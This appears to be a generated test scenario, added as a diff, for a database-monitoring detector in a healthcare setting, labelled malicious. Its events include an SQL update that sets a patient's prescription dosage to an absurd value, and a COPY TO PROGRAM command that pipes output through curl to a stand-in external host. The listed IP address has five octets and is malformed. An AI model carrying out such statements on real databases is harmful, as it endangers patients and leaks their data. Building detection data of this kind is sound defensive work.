@@ -1,0 +1,23 @@
+scenario_id: gen_healthcare_54_data_tamper_mal_1550
+family_id: gen_healthcare_54_data_tamper_mal_fam1550
+domain: healthcare
+time_of_day: '22:35'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: nurse
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.5
+  events:
+  - step_id: act
+    sql: UPDATE prescriptions SET dosage = 504891 WHERE patient_id = 61663
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://sync.partner-mirror.example/ingest
+      -d @-'
+    connects_to:
+      ip: 141.98.11.175.232
+      port: 3389
